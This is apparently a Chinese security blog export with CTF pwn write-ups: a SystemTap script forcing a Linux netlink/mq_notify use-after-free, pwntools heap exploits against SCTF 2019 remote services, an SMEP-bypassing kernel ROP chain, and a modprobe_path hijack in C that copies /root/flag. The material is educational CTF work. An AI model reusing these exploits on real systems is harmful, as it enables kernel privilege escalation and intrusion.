(before) nlk-&gt;state = %x\n", (nlk-&gt;state &amp; 0x1));nlk-&gt;state |= 1; _stp_printf("- (after) nlk-&gt;state = %x\n", (nlk-&gt;state &amp; 0x1));// mark it DEAD_stp_printf("- sk-&gt;sk_flags = %x\n", sk-&gt;sk_flags);_stp_printf("- SOCK_DEAD = %x\n", SOCK_DEAD);sk-&gt;sk_flags |= (1 &lt;&lt; SOCK_DEAD);_stp_printf("- sk-&gt;sk_flags = %x\n", sk-&gt;sk_flags); 重新运行脚本会发现exp陷入了内核的死循环中，原因是： 内核进入了netlink_attachskb()并被我们强制执行到retry the thread is not scheduled (we by-passed it) netlink_attachskb()返回1 返回到mq_notify()后，再次执行goto retry fget()返回非NULL 再次进入netlink_getsockbyfilp() 再次进入netlink_attachskb()并不断循环 虽然我们绕过了阻塞，但是进入了死循环当中。 停止死循环首先让第二个fget()失败，做法是直接将fd从FDT中移除（设置成NULL）。 123456789101112131415161718192021222324 %&#123; #include &lt;linux/fdtable.h&gt; %&#125;function remove_fd3_from_fdt:long (arg_unused:long)%&#123; struct files_struct *files = NULL; struct fdtable *fdt = NULL; _stp_printf("!!&gt;&gt;&gt; REMOVING FD=3 FROM FDT &lt;&lt;&lt;!!\n"); files = current-&gt;files; fdt = files_fdtable(files); fdt-&gt;fd[3] = NULL;%&#125; probe kernel.function ("netlink_attachskb") &#123; if (execname() == "exploit") &#123; printf("(%d-%d) [netlink] ==&gt;&gt; netlink_attachskb (%s)\n", pid(), tid(), $$parms) dump_netlink_sock($sk); // it also marks the socket as DEAD and CONGESTED remove_fd3_from_fdt(0); &#125; &#125; 执行exp： 1234567891011121314151617181920212223242526272829(5089-5089) &gt;&gt;&gt; mq_notify (4294967295, 0x7ffe27114170)(5089-5089) &gt;&gt;&gt; copy_from_user()(5089-5089) &gt;&gt;&gt; alloc_skb (priority=? size=?)(5089-5089) &gt;&gt;&gt; copy_from_user()(5089-5089) &gt;&gt;&gt; skb_put (skb=0xffff88003aeef000 len=0x20)(5089-5089) &lt;&lt;&lt; skb_put = ffff88003d838600(5089-5089) &gt;&gt;&gt; __fdget (fd=0x3)(5089-5089) &lt;&lt;&lt; __fdget = ffff88000793ba00(5089-5089) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff88000793ba00)(5089-5089) &lt;&lt;&lt; netlink_getsockbyfilp = ffff88003a2ed800(5089-5089) &gt;&gt;&gt; netlink_attachskb (sk=0xffff88003a2ed800 skb=0xffff88003aeef000 timeo=0xffff88003a32bf08 ssk=0x0)-=&#123; dump_netlink_sock: 0xffff88003a2ed800 &#125;=-- sk = 0xffff88003a2ed800- sk-&gt;sk_rmem_alloc = 0- sk-&gt;sk_rcvbuf = 212992- sk-&gt;sk_refcnt = 2- (before) nlk-&gt;state = 0- (after) nlk-&gt;state = 1- sk-&gt;sk_flags = 100- SOCK_DEAD = 0- sk-&gt;sk_flags = 101-=&#123; dump_netlink_sock: END&#125;=-!!&gt;&gt;&gt; REMOVING FD=3 FROM FDT &lt;&lt;&lt;!!(5089-5089) &lt;&lt;&lt; netlink_attachskb = 1(5089-5089) &gt;&gt;&gt; __fdget (fd=0x3)(5089-5089) &lt;&lt;&lt; __fdget = 0(5089-5089) &gt;&gt;&gt; netlink_detachskb (sk=0xffff88003a2ed800 skb=0xffff88003aeef000)(5089-5089) &lt;&lt;&lt; netlink_detachskb(5089-5089) &lt;&lt;&lt; mq_notify = fffffffffffffff7 内核从之前的无限循环中跳出并且我们越来越接近攻击场景： netlink_attachskb()返回1 第二次fget()返回NULL 所以，我们触发了漏洞吗？ 查看refcounter一切都按照着我们的计划进行，因此漏洞也应该被触发使得sock的refcounter被减少了两次。在return的probe中，是无法使用enter的probe中的调用参数的，这意味着当netlnk_attachskb()返回时，我们无法检查sock的内容。 一种解决方法是将netlink_getsockbyfilp()返回的sock指针保存在全局变量中，然后再进行输出： 123456789101112131415161718192021222324global sock_ptr = 0; // &lt;------ declared globally!probe syscall.mq_notify.return&#123; if (execname() == "exploit") &#123; if (sock_ptr != 0) // &lt;----- watch your NULL-deref, this is kernel-land! &#123; dump_netlink_sock(sock_ptr); sock_ptr = 0; &#125; printf("(%d-%d) [SYSCALL] &lt;&lt;== mq_notify= %d\n\n", pid(), tid(), $return) &#125;&#125;probe kernel.function ("netlink_getsockbyfilp").return&#123; if (execname() == "exploit") &#123; printf("(%d-%d) [netlink] &lt;&lt;== netlink_getsockbyfilp = %x\n", pid(), tid(), $return) sock_ptr = $return; // &lt;----- store it &#125;&#125; 输出： 1234567891011121314151617181920212223242526272829303132333435363738(5409-5409) &gt;&gt;&gt; mq_notify (4294967295, 0x7ffc59d68a00)(5409-5409) &gt;&gt;&gt; copy_from_user()(5409-5409) &gt;&gt;&gt; alloc_skb (priority=? size=?)(5409-5409) &gt;&gt;&gt; copy_from_user()(5409-5409) &gt;&gt;&gt; skb_put (skb=0xffff88003d46af00 len=0x20)(5409-5409) &lt;&lt;&lt; skb_put = ffff88003ac73e00(5409-5409) &gt;&gt;&gt; __fdget (fd=0x3)(5409-5409) &lt;&lt;&lt; __fdget = ffff8800373f6e00(5409-5409) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff8800373f6e00)(5409-5409) &lt;&lt;&lt; netlink_getsockbyfilp = ffff880036446000(5409-5409) &gt;&gt;&gt; netlink_attachskb (sk=0xffff880036446000 skb=0xffff88003d46af00 timeo=0xffff88003a3bbf08 ssk=0x0)-=&#123; dump_netlink_sock: 0xffff880036446000 &#125;=-- sk = 0xffff880036446000- sk-&gt;sk_rmem_alloc = 0- sk-&gt;sk_rcvbuf = 212992- sk-&gt;sk_refcnt = 2- (before) nlk-&gt;state = 0- (after) nlk-&gt;state = 1- sk-&gt;sk_flags = 100- SOCK_DEAD = 0- sk-&gt;sk_flags = 101-=&#123; dump_netlink_sock: END&#125;=-!!&gt;&gt;&gt; REMOVING FD=3 FROM FDT &lt;&lt;&lt;!!(5409-5409) &lt;&lt;&lt; netlink_attachskb = 1(5409-5409) &gt;&gt;&gt; __fdget (fd=0x3)(5409-5409) &lt;&lt;&lt; __fdget = 0(5409-5409) &gt;&gt;&gt; netlink_detachskb (sk=0xffff880036446000 skb=0xffff88003d46af00)(5409-5409) &lt;&lt;&lt; netlink_detachskb-=&#123; dump_netlink_sock: 0xffff880036446000 &#125;=-- sk = 0xffff880036446000- sk-&gt;sk_rmem_alloc = 0- sk-&gt;sk_rcvbuf = 212992- sk-&gt;sk_refcnt = 0- nlk-&gt;state = 1- sk-&gt;sk_flags = 101- SOCK_DEAD = 0-=&#123; dump_netlink_sock: END&#125;=-(5409-5409) &lt;&lt;&lt; mq_notify = fffffffffffffff7 可以看到refcounter从2被减为0，触发漏洞成功。由于refcounter为0，意味着会被释放，加入更多的probe监控kfree： 1234567probe kernel.function("kfree")&#123; if (execname()=="exploit") &#123; printf("(%d-%d) &gt;&gt;&gt; kfree (%s)\n", pid(), tid(), $$parms) &#125;&#125; 输出： 12345678910111213141516171819202122232425262728293031323334353637383940(5729-5729) &gt;&gt;&gt; mq_notify (4294967295, 0x7ffdf31f9fb0)(5729-5729) &gt;&gt;&gt; copy_from_user()(5729-5729) &gt;&gt;&gt; alloc_skb (priority=? size=?)(5729-5729) &gt;&gt;&gt; copy_from_user()(5729-5729) &gt;&gt;&gt; skb_put (skb=0xffff88003ac76d00 len=0x20)(5729-5729) &lt;&lt;&lt; skb_put = ffff88003a9d7e00(5729-5729) &gt;&gt;&gt; __fdget (fd=0x3)(5729-5729) &lt;&lt;&lt; __fdget = ffff8800078bd700(5729-5729) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff8800078bd700)(5729-5729) &lt;&lt;&lt; netlink_getsockbyfilp = ffff88003af98800(5729-5729) &gt;&gt;&gt; netlink_attachskb (sk=0xffff88003af98800 skb=0xffff88003ac76d00 timeo=0xffff88003a3d3f08 ssk=0x0)-=&#123; dump_netlink_sock: 0xffff88003af98800 &#125;=-- sk = 0xffff88003af98800- sk-&gt;sk_rmem_alloc = 0- sk-&gt;sk_rcvbuf = 212992- sk-&gt;sk_refcnt = 2- (before) nlk-&gt;state = 0- (after) nlk-&gt;state = 1- sk-&gt;sk_flags = 100- SOCK_DEAD = 0- sk-&gt;sk_flags = 101-=&#123; dump_netlink_sock: END&#125;=-!!&gt;&gt;&gt; REMOVING FD=3 FROM FDT &lt;&lt;&lt;!!(5729-5729) &lt;&lt;&lt; netlink_attachskb = 1(5729-5729) &gt;&gt;&gt; __fdget (fd=0x3)(5729-5729) &lt;&lt;&lt; __fdget = 0(5729-5729) &gt;&gt;&gt; netlink_detachskb (sk=0xffff88003af98800 skb=0xffff88003ac76d00)(5729-5729) &gt;&gt;&gt; kfree (objp=0xffff88003a9d7e00)(5729-5729) &gt;&gt;&gt; kfree (objp=0xffff88003af98800)(5729-5729) &lt;&lt;&lt; netlink_detachskb-=&#123; dump_netlink_sock: 0xffff88003af98800 &#125;=-- sk = 0xffff88003af98800- sk-&gt;sk_rmem_alloc = 0- sk-&gt;sk_rcvbuf = 212992- sk-&gt;sk_refcnt = 0- nlk-&gt;state = 1- sk-&gt;sk_flags = 101- SOCK_DEAD = 0-=&#123; dump_netlink_sock: END&#125;=-(5729-5729) &lt;&lt;&lt; mq_notify = fffffffffffffff7 虽然sock被释放了，但还没有use after free。 为什么内核没有崩溃？与我们最初的计划不同的是，netlink_sock对象被netlink_detachskb()释放。原因是我们没有调用close()函数（仅重置了FDT），文件对象实际上没有释放，因此netlink_sock对象的引用没有被减少。换句话说，我们少了一次对引用的减少操作。但我们目前只是要验证refcounter是否会被减少两次（netlink_attachskb()和netlink_detachskb()各一次）。 In the normal course of operation (i.e. we call close()), this additional refcounter decrease will occur and netlink_detachskb() will do a UAF. We will even “delay” this use-after-free to a later moment to get a better control (cf. part 2). 最终的SystemTap脚本123456789101112131415161718192021222324252627282930# mq_notify_force_crash.stp## Run it with "stap -v -g ./mq_notify_force_crash.stp" (guru mode)%&#123;#include &lt;net/sock.h&gt;#include &lt;net/netlink_sock.h&gt;#include &lt;linux/fdtable.h&gt;%&#125;function force_trigger:long (arg_sock:long)%&#123; struct sock *sk = (void*) STAP_ARG_arg_sock; sk-&gt;sk_flags |= (1 &lt;&lt; SOCK_DEAD); // avoid blocking the thread struct netlink_sock *nlk = (void*) sk; nlk-&gt;state |= 1; // enter the netlink_attachskb() retry path struct files_struct *files = current-&gt;files; struct fdtable *fdt = files_fdtable(files); fdt-&gt;fd[3] = NULL; // makes the second call to fget() fails%&#125;probe kernel.function ("netlink_attachskb")&#123; if (execname() == "exploit") &#123; force_trigger($sk); &#125;&#125; 0x06 结论在本文中，我们主要介绍了漏洞的相关知识并使用System Tap Guru Mode强制触发漏洞。在下一部分的文章，我们将一步步把当前的从内核态强制触发漏洞的代码转换成从用户态触发。]]></content>
      <tags>
        <tag>kernel</tag>
        <tag>cve</tag>
        <tag>vul</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SCTF 2019 pwn writeup]]></title>
    <url>%2F2019%2F07%2F17%2Fsctf2019-pwn%2F</url>
    <content type="text"><![CDATA[比赛和考试连轴转，都没时间写博客了，先把SCTF 2019的补上。 one_heapTcache Double Free来获取Unsorted Bin，将count变为0xff后再释放即可获得0x90大小的Unsorted Bin。接着利用堆块重叠爆破到stdout泄漏libc地址和拿到hook的空间来getshell。直接通过__malloc_hook还无法getshell，因此利用__realloc_hook来满足one_gadget的条件。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#coding=utf-8from pwn import *context.update(arch='amd64',os='linux')context.terminal = ['tmux','split','-h']debug = 0libc = ELF('./libc-2.27.so')def New(p, size,content): p.recvuntil('Your choice:') p.sendline('1') p.recvuntil('Input the size:') p.sendline(str(size)) p.recvuntil('Input the content:') p.send(content)def Delete(p): p.recvuntil('Your choice:') p.sendline('2')def exp(): p = remote('47.104.89.129', 10001) New(p, 0x7f,'\n') #0 New(p, 0x7f,'\n') #1 Delete(p) Delete(p) New(p, 0x2f, p64(0) * 4 + p64(0x90) + '\x20' + '\n') #2 Delete(p) New(p, 0x7f,'\n') #3 New(p, 0x7f,'\n') #4 New(p, 0x7f,'\n') #5 Delete(p) New(p, 0x20,'\x60\x07\xdd'+'\n') #6 New(p, 0x7f, p64(0) * 5 + p64(0x91) + '\n') #7 New(p, 0x7f,p64(0xfbad1800)+p64(0)*3+'\x00'+'\n') #8 #libc try: p.recvn(8) except Exception as identifier: p.close() return leak_addr = u64(p.recvn(6).ljust(8,'\x00')) libc_base = leak_addr - (0x7ffff7dd18b0-0x00007ffff79e4000) print "libc_base:",hex(libc_base) New(p, 0x68, p64(0) * 11 + p64(0x41) + p64(libc.symbols['__realloc_hook'] + libc_base)) New(p, 0x38, '\n') one_gadget = 0x10a38c New(p, 0x38, p64(libc_base+one_gadget)+p64(libc_base+libc.symbols['realloc']+4) + '\n') # gdb.attach(p) New(p, 0x50,'eeee\n') p.sendline('cat flag') print p.recvline() p.sendline('cat /flag') #sctf&#123;TCAch3_So000o0o_3asY&#125; print p.recvline() p.interactive()while 1: exp() two_heap非预期解。 利用%a泄漏libc地址（xmm），然后Tcache Double Free修改__free_hook来getshell。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *def add(p, size, content): p.sendlineafter('Your choice:', '1') p.sendlineafter('Input the size:\n', str(size)) if size != len(content): p.sendlineafter('Input the note:\n', content) else: p.sendafter('Input the note:\n', content)def delete(p, idx): p.sendlineafter('Your choice:', '2') p.sendlineafter('Input the index:\n', str(idx))def pwn(): DEBUG = 0 p = remote('47.104.89.129', 10002) libc = ELF('./libc-2.26.so') context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] p.sendlineafter('Welcome to SCTF:\n', '%a%2$a%3$a') p.recvuntil('00x0.0') recv = '0x' + p.recvuntil('p', drop=True) + '0' recv = int(recv, 16) libc.address = recv - (0x7fb4fcb49720 - 0x00007fb4fc99a000) add(p, 0x0, '') delete(p, 0) delete(p, 0) add(p, 0x8, p64(libc.symbols['__free_hook'])) add(p, 0x10, 'sunichi') add(p, 0x18, p64(libc.symbols['system'])) add(p, 0x30, '/bin/sh\x00') delete(p, 4) print 'libc:' + hex(libc.address) if DEBUG == 1: gdb.attach(p) # sctf&#123;10338cd036cf633f9c8e888306370403&#125; p.interactive() p.close()if __name__ == '__main__': pwn() easy_heapoff-by-null漏洞制造堆块重叠，然后利用fastbin爆破分配到stdout来泄漏libc地址，最后利用fastbin double free修改__malloc_hook来getshell。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990from pwn import *def add(p, size): p.sendlineafter('&gt;&gt; ', str(1)) p.sendlineafter('Size: ', str(size)) p.recvuntil('Pointer Address ') recv = p.recvuntil('\n', drop=True) return int(recv, 16)def delete(p, idx): p.sendlineafter('&gt;&gt; ', str(2)) p.sendlineafter('Index: ', str(idx))def fill(p, idx, content): p.sendlineafter('&gt;&gt; ', str(3)) p.sendlineafter('Index: ', str(idx)) p.sendafter('Content: ', content)def pwn(): DEBUG = 0 if DEBUG == 1: p = process('./easy_heap') libc = ELF('./libc.so.6') context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] else: p = remote('132.232.100.67', 10004) libc = ELF('./libc.so.6') context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] p.recvuntil('Mmap: ') recv = p.recvuntil('\n', drop=True) mmap_addr = int(recv, 16) add(p, 0xf8) #0 add(p, 0x68) #1 add(p, 0xf8) #2 add(p, 0x68) #3 payload = p64(0) * 12 + p64(0x170) delete(p, 0) #0 fill(p, 1, payload) delete(p, 2) #2 delete(p, 1) #1 add(p, 0xf8) #0 delete(p, 0) add(p, 0xc8) #0 add(p, 0x88) #1 payload = p64(0) * 5 + p64(0x71) + p64(0x25dd)[:2] + '\n' fill(p, 1, payload) add(p, 0x68) #2 add(p, 0x68) #4 payload = '\x00' * 3 + p64(0) * 6 + p64(0xfbad1800) + p64(0) * 3 + '\x00' + '\n' fill(p, 4, payload) p.recvuntil(p64(0xfbad1800) + p64(0) * 3) recv = p.recv(8) libc.address = u64(recv) - (0x7ffff7dd2600 - 0x00007ffff7a0d000) delete(p, 1) #1 add(p, 0x20) #1 add(p, 0x68) #5 delete(p, 2) delete(p, 3) delete(p, 5) add(p, 0x68) #2 fill(p, 2, p64(libc.symbols['__malloc_hook'] - 0x13) + '\n') add(p, 0x68) #3 add(p, 0x68) #5 add(p, 0x68) #6 payload = '\x00\x00\x00' + p64(libc.address + 0xf02a4) + '\n' fill(p, 6, payload) delete(p, 2) delete(p, 5) print 'libc:' + hex(libc.address) if DEBUG == 1: gdb.attach(p) p.interactive() #sctf&#123;4110c_D3l37_Fi11_r3pe7&#125; p.close()if __name__ == '__main__': pwn()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
        <tag>sctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[由一个Kernel Pwn引发的血案]]></title>
    <url>%2F2019%2F04%2F29%2Fhow-to-ret2usr%2F</url>
    <content type="text"><![CDATA[趁热把kernel pwn的一些东西整理一下。 前置知识KASLR内核地址空间布局随机化，并不默认开启，需要在内核命令行中添加指定指令。 代码段和模块基地址通过在启动时( CONFIG_RANDOMIZE_BASE)对内核的物理和虚拟地址的基地址进行重定位。另外，随机加载基地址意味着系统每次启动以相同的顺序加载相同的模块不会共享同样的基地址。 栈基如果内核栈的基地址对于不同的进程甚至系统调用都不一样，攻击将变得很困难。 动态内存基根据早期启动的初始化，太多的内核动态内存（比如kmalloc, vmalloc, etc）都有相对确定性的内存布局。如果这些区域的基地址在不同的启动是不同的，攻击会受挫，从而需要特定区域的信息泄漏。 SMEP&amp;SMAPSMEP是2012年在Intel Ivybridge中加入的特性，而SMAP则在2014年的Intel Broadwell中加入。其作用分别是禁止内核访问用户空间的数据和禁止内核执行用户空间的代码。当程序处于内核空间时，在保护开启的情况下，访问或执行内核数据将会发生错误。 CISCN 2017 babydriverUAF常规方法，利用UAF修改cred以达到提权的目的。 Bypass SMEP &amp; ret2usr当内核开启了SMEP后，无法在内核空间直接执行用户空间代码，因此需要绕过SMEP保护来提权。系统根据CR4寄存器的第20位判断是否开启SMEP保护，CR4寄存器的值可通过诸如mov cr4, xxx来修改。为了关闭SMEP，通常向CR4寄存器写入0x6f0。 通过open(&quot;/dev/ptmx&quot;, O_RDWR)来让内核分配一个tty_struct结构体： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152struct tty_struct &#123; int magic; struct kref kref; struct device *dev; struct tty_driver *driver; const struct tty_operations *ops; int index; /* Protects ldisc changes: Lock tty not pty */ struct ld_semaphore ldisc_sem; struct tty_ldisc *ldisc; struct mutex atomic_write_lock; struct mutex legacy_mutex; struct mutex throttle_mutex; struct rw_semaphore termios_rwsem; struct mutex winsize_mutex; spinlock_t ctrl_lock; spinlock_t flow_lock; /* Termios values are protected by the termios rwsem */ struct ktermios termios, termios_locked; struct termiox *termiox; /* May be NULL for unsupported */ char name[64]; struct pid *pgrp; /* Protected by ctrl lock */ struct pid *session; unsigned long flags; int count; struct winsize winsize; /* winsize_mutex */ unsigned long stopped:1, /* flow_lock */ flow_stopped:1, unused:BITS_PER_LONG - 2; int hw_stopped; unsigned long ctrl_status:8, /* ctrl_lock */ packet:1, unused_ctrl:BITS_PER_LONG - 9; unsigned int receive_room; /* Bytes free for queue */ int flow_change; struct tty_struct *link; struct fasync_struct *fasync; wait_queue_head_t write_wait; wait_queue_head_t read_wait; struct work_struct hangup_work; void *disc_data; void *driver_data; spinlock_t files_lock; /* protects tty_files list */ struct list_head tty_files;#define N_TTY_BUF_SIZE 4096 int closing; unsigned char *write_buf; int write_cnt; /* If the tty has a pending do_SAK, queue it here - akpm */ struct work_struct SAK_work; struct tty_port *port;&#125; __randomize_layout; 主要关注第五个成员const struct tty_operations *ops： 123456789101112131415161718192021222324252627282930313233343536373839404142434445struct tty_operations &#123; struct tty_struct * (*lookup)(struct tty_driver *driver, struct file *filp, int idx); int (*install)(struct tty_driver *driver, struct tty_struct *tty); void (*remove)(struct tty_driver *driver, struct tty_struct *tty); int (*open)(struct tty_struct * tty, struct file * filp); void (*close)(struct tty_struct * tty, struct file * filp); void (*shutdown)(struct tty_struct *tty); void (*cleanup)(struct tty_struct *tty); int (*write)(struct tty_struct * tty, const unsigned char *buf, int count); int (*put_char)(struct tty_struct *tty, unsigned char ch); void (*flush_chars)(struct tty_struct *tty); int (*write_room)(struct tty_struct *tty); int (*chars_in_buffer)(struct tty_struct *tty); int (*ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg); long (*compat_ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg); void (*set_termios)(struct tty_struct *tty, struct ktermios * old); void (*throttle)(struct tty_struct * tty); void (*unthrottle)(struct tty_struct * tty); void (*stop)(struct tty_struct *tty); void (*start)(struct tty_struct *tty); void (*hangup)(struct tty_struct *tty); int (*break_ctl)(struct tty_struct *tty, int state); void (*flush_buffer)(struct tty_struct *tty); void (*set_ldisc)(struct tty_struct *tty); void (*wait_until_sent)(struct tty_struct *tty, int timeout); void (*send_xchar)(struct tty_struct *tty, char ch); int (*tiocmget)(struct tty_struct *tty); int (*tiocmset)(struct tty_struct *tty, unsigned int set, unsigned int clear); int (*resize)(struct tty_struct *tty, struct winsize *ws); int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew); int (*get_icount)(struct tty_struct *tty, struct serial_icounter_struct *icount); void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);#ifdef CONFIG_CONSOLE_POLL int (*poll_init)(struct tty_driver *driver, int line, char *options); int (*poll_get_char)(struct tty_driver *driver, int line); void (*poll_put_char)(struct tty_driver *driver, int line, char ch);#endif int (*proc_show)(struct seq_file *, void *);&#125; __randomize_layout; 它是一个函数表，当操作打开的/dev/ptmx时，会调用tty_operations中相应的函数。通过劫持函数表来stack pivot进而通过ROP关闭SMEP并返回到用户空间代码。tty_struct使用大小为0x400的slab（0x200～0x400，具体原因可见slab的划分），但tty_operations并不通过slab分配。 解压bzImage获取vmlinux，使用Ropper获取gadget。 123sudo apt-get install linux-headers-$(uname -r)sudo /usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux bzImage &gt; vmlinuxRopper.py --file vmlinux --nocolor &gt; gadget 123456789101112131415161718192021222324252627282930313233343536373839404142tty_operations.ioctl = xchg_esp_eax;fake_stack = mmap(xchg_esp_eax &amp; 0xfffff000, 0x3000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);rop[0] = p_rxx;rop[1] = 0x6f0 ; rop[2] = write_cr4; // mov cr4, rxxrop[3] = get_root;rop[4] = swapgs;rop[5] = iretq;rop[6] = get_shell;rop[7] = user_cs;rop[8] = user_eflags;rop[9]= user_sp;rop[10]= user_ss;memcpy(xchg_esp_eax &amp; 0xffffffff, data, sizeof(data));/**unsigned long user_cs, user_ss, user_eflags,user_sp ;void save_stats() &#123; asm( "movq %%cs, %0\n" "movq %%ss, %1\n" "movq %%rsp, %3\n" "pushfq\n" "popq %2\n" :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp) : : "memory" );&#125;or use mmap area for rspunsigned long user_cs, user_ss, user_rflags;static void save_state() &#123; asm( "movq %%cs, %0\n" "movq %%ss, %1\n" "pushfq\n" "popq %2\n" : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory");&#125;**/ ROP链如上，在对打开的/dev/ptmx进行操作时，执行xchg eax, esp，这个时候rax的值是xchg eax, esp的地址，使得栈被迁移到了我们可控的地方xchg_esp_eax &amp; 0xffffffff。0到2步即修改CR4的值来关闭SMEP，第3步提权，接着4到5步用于返回用户空间（使用iretq指令返回到用户空间，在执行iretq之前，执行swapgs【64bit下】指令。该指令通过用一个MSR中的值交换GS寄存器的内容，用来获取指向内核数据结构的指针，然后才能执行系统调用之类的内核空间程序）。 iretq栈布局： 1234567891011|----------------------|| RIP |&lt;== low mem|----------------------|| CS ||----------------------|| EFLAGS ||----------------------|| RSP ||----------------------|| SS |&lt;== high mem|----------------------| 0CTF 2017 knote[Working Hard] Midnight Sun CTF Quals hfsipcoff-by-one漏洞，能够向后溢出一个字节，slab的结构使得移出一个字节时能够直接修改fd。通过修改fd能够任意地址读写。 Hijack cred找到cred所在的slab区域，将对应的0x3e8改为0x0。 Hijack modprobe当系统遇到无法识别格式的程序时，会运行modprobe_path指向的程序进行调用。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;sched.h&gt;#include &lt;errno.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/sem.h&gt;#define CHANNEL_CREATE 0xABCD0001#define CHANNEL_DELETE 0xABCD0002#define CHANNEL_READ 0xABCD0003#define CHANNEL_WRITE 0xABCD0004struct channel_info &#123; long id; long size; char *buffer;&#125;;// Create a new hfs channelvoid create_channel(int fd, int id, int size) &#123; struct channel_info channel; channel.id = id; channel.size = size; ioctl(fd, CHANNEL_CREATE, &amp;channel); printf("[+] Create %d channel\n", id);&#125;// Delete hfs channelvoid delete_channel(int fd, long id) &#123; ioctl(fd, CHANNEL_DELETE, &amp;id); printf("[+] Delete %d channel\n", id);&#125;// Read from hfs channel into destvoid read_channel(int fd, int id, char *dest, int size) &#123; struct channel_info channel; channel.id = id; channel.size = size; channel.buffer = dest; ioctl(fd, CHANNEL_READ, &amp;channel); printf("[+] Read %d channel\n", id);&#125;// Write into hfs channel from srcvoid write_channel(int fd, int id, char *src, int size) &#123; struct channel_info channel; channel.id = id; channel.size = size; channel.buffer = src; ioctl(fd, CHANNEL_WRITE, &amp;channel); printf("[+] Write %d channel\n", id);&#125;void trigger() &#123; system("/home/user/ll"); system("cat /home/user/flag");&#125;void exploit() &#123; system("echo -ne '#!/bin/sh\n/bin/cp /root/flag /home/user/flag\n/bin/chmod 777 /home/user/flag' &gt; /home/user/getflag.sh"); system("chmod +x /home/user/getflag.sh"); system("echo -ne '\\xff\\xff\\xff\\xff' &gt; /home/user/ll"); system("chmod +x /home/user/ll"); printf("[+] Open hfs device\n"); int fd = open("/dev/hfs", O_RDWR); printf("[+] Create initial channels\n"); char buf[0x1000]; unsigned long long** payload = (unsigned long long**)buf; unsigned long long modprobe_addr = 0xffffffff81a3f7a0; memset(buf, 0, 0x1000); int count = 1; for (count = 1; count &lt; 0x11; count++) &#123; if (count == 5) &#123; create_channel(fd, 0, 0x20); &#125; else &#123; create_channel(fd, count, 0x20); &#125; &#125; delete_channel(fd, 7); buf[0x20] = '\x20'; write_channel(fd, 6, buf, 0x21); create_channel(fd, 0x20, 0x20); for (count = 1; count &lt; 5; count++) &#123; delete_channel(fd, count); &#125; payload[0] = 0x30; payload[1] = modprobe_addr; payload[2] = 0x100; write_channel(fd, 0x20, payload, 0x18); strcpy(buf, "/home/user/getflag.sh"); write_channel(fd, 0x30, buf, 0x20); trigger(); close(fd);&#125;int main() &#123; exploit(); return 0;&#125; *CTF 2019 hackme比赛调的时候把smap关掉了，结果在开启kaslr+smep的情况下做出来了，但是没绕过smap。 参考Balsn的exploit：https://balsn.tw/ctf_writeup/ 驱动中的读和写函数存在if检查绕过的情况，使得对slab的读、编辑操作可以向前溢出。 1234567891011121314151617181920212223242526if ( v3 == 0x30002 ) // edit&#123; idx = 2LL * args; chunk_ptr = POOL[idx]; node_addr = &amp;POOL[idx]; if ( chunk_ptr &amp;&amp; offset + size &lt;= (unsigned __int64)node_addr[1] ) &#123; copy_from_user(offset + chunk_ptr, buffer, size); return 0LL; &#125;&#125;else if ( v3 == 0x30003 ) // read&#123; idx = 2LL * args; chunk_ptr = POOL[idx]; node_addr = &amp;POOL[idx]; if ( chunk_ptr ) &#123; if ( offset + size &lt;= (unsigned __int64)node_addr[1] ) &#123; copy_to_user(buffer, offset + chunk_ptr, size); return 0LL; &#125; &#125;&#125;return -1LL; 首先通过向前读来泄漏slab和内核堆地址。 12345678910111213141516171819202122232425262728293031323334size_t get_heapaddr(int fd) &#123; char buf[0x400]; memset(buf, '\x00', 0x400); add(fd, 0, buf, 0x100); add(fd, 1, buf, 0x100); add(fd, 2, buf, 0x100); delete(fd, 0); delete(fd, 1); show(fd, 2, readbuf, 0x100, -0x100); delete(fd, 2); return readbuf[0];&#125;size_t get_kerneladdr(int fd) &#123; char buf[0x400]; memset(buf, '\x00', 0x400); add(fd, 0, buf, 0x400); show(fd, 0, readbuf, 0xa00, -0xa00); //size_t i = 0; //for (i = 0; i &lt; 0xa00/8; i++) // printf("%d=%llx\n", i, readbuf[i]); delete(fd, 0); return readbuf[25];&#125; SMEP开启的情况下SMEP&amp;SMAP开启的情况下musl-gcc从官网下载source code。 123sudo ./configure &amp;&amp; sudo make installsudo cp ./obj/musl-gcc /bin/musl-gcc --static -Os source.c -o output Using SSH in pwntools马克一下大佬的脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#!/usr/bin/pythonfrom pwn import *HOST = "35.221.78.115"PORT = 10022USER = "pwn"PW = "pwn"def compile(): log.info("Compile") os.system("musl-gcc -w -s -static -o3 pwn2.c -o pwn")def exec_cmd(cmd): r.sendline(cmd) 